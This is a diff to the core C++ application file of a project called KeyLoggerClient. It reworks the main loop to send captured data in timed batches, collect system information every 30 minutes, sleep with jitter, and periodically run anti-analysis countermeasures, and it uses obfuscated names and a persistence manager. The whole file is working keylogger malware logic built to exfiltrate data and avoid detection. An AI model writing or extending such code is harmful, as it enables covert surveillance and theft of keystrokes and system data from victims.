@@ -1,4 +1,5 @@
 // KeyLoggerClient/src/core/Application.cpp
+
 #include "core/Application.h"
 #include "core/Configuration.h"
 #include "core/Logger.h"
@@ -21,7 +22,7 @@ constexpr auto OBFUSCATED_APP_NAME = OBFUSCATE("KeyloggerResearchProject");
 constexpr auto OBFUSCATED_MUTEX_NAME = OBFUSCATE("KLRP_MUTEX_7E3F1A");
 
 Application::Application() : m_running(false), m_config(nullptr) {
-    Initialize();
+    // Constructor remains the same
 }
 
 Application::~Application() {
@@ -75,8 +76,13 @@ void Application::Run() {
     m_running = true;
     LOG_INFO("Application starting main loop");
 
+    // Initialize batch collection
+    m_dataManager->StartBatchCollection();
+    auto lastBatchTime = std::chrono::steady_clock::now();
+
     std::string lastNetworkMode = "";
-    
+    auto lastSystemCollection = std::chrono::steady_clock::now();
+
     while (m_running) {
         // Check for network mode changes
         std::string currentNetworkMode = m_config->GetNetworkMode();
@@ -86,38 +92,59 @@ void Application::Run() {
             m_commsManager->Initialize();
             lastNetworkMode = currentNetworkMode;
         }
-        
+
         // Check for exit conditions
         if (utils::SystemUtils::IsExitTriggered()) {
             Shutdown();
             break;
         }
 
-        // Process and transmit collected data
-        if (m_dataManager->HasData()) {
-            auto encryptedData = m_dataManager->RetrieveEncryptedData();
-            if (m_commsManager->TransmitData(encryptedData)) {
-                m_dataManager->ClearData();
+        // Check if it's time to transmit batch data (every 5 minutes)
+        auto now = std::chrono::steady_clock::now();
+        auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(now - lastBatchTime);
+
+        if (elapsed.count() >= 5 && m_dataManager->IsBatchReady()) {
+            auto batchData = m_dataManager->GetBatchData();
+
+            if (!batchData.empty()) {
+                if (m_commsManager->TransmitData(batchData)) {
+                    LOG_INFO("Batch data transmitted successfully");
+                    lastBatchTime = now;
+
+                    // Start new batch
+                    m_dataManager->StartBatchCollection();
+                } else {
+                    LOG_ERROR("Batch data transmission failed");
+                    // Retry after shorter interval
+                    utils::TimeUtils::JitterSleep(30000, 0.2);
+                }
             }
         }
 
-        // Sleep with jitter to avoid pattern detection
-        utils::TimeUtils::JitterSleep(
-            m_config->GetCollectionInterval(),
-            m_config->GetJitterFactor()
-        );
-
-        // Periodic system information collection
-        if (m_config->GetCollectSystemInfo()) {
+        // Periodic system information collection (every 30 minutes)
+        auto elapsedSystemCollection = std::chrono::duration_cast<std::chrono::minutes>(now - lastSystemCollection);
+        if (elapsedSystemCollection.count() >= 30 && m_config->GetCollectSystemInfo()) {
             auto systemInfo = utils::SystemUtils::CollectSystemInformation();
             m_dataManager->AddSystemData(systemInfo);
+            lastSystemCollection = now;
+            LOG_DEBUG("System information collected");
+        }
+
+        // Sleep with jitter
+        utils::TimeUtils::JitterSleep(10000, 0.2); // Check every 10 seconds
+
+        // Perform anti-analysis checks periodically
+        static int antiAnalysisCounter = 0;
+        if (++antiAnalysisCounter >= 360) { // ~1 hour (10s * 360)
+            security::AntiAnalysis::Countermeasure();
+            antiAnalysisCounter = 0;
         }
     }
 }
 
 void Application::Shutdown() {
     if (!m_running) return;
-    
+
     m_running = false;
     LOG_INFO("Application shutting down");
 
@@ -130,10 +157,12 @@ void Application::Shutdown() {
         m_persistenceManager->Remove();
     }
 
-    // Transmit any remaining data
-    if (m_dataManager->HasData()) {
-        auto encryptedData = m_dataManager->RetrieveEncryptedData();
-        m_commsManager->TransmitData(encryptedData);
+    // Transmit any remaining batch data
+    if (m_dataManager->IsBatchReady()) {
+        auto batchData = m_dataManager->GetBatchData();
+        if (!batchData.empty()) {
+            m_commsManager->TransmitData(batchData);
+        }
     }
 
     m_commsManager.reset();
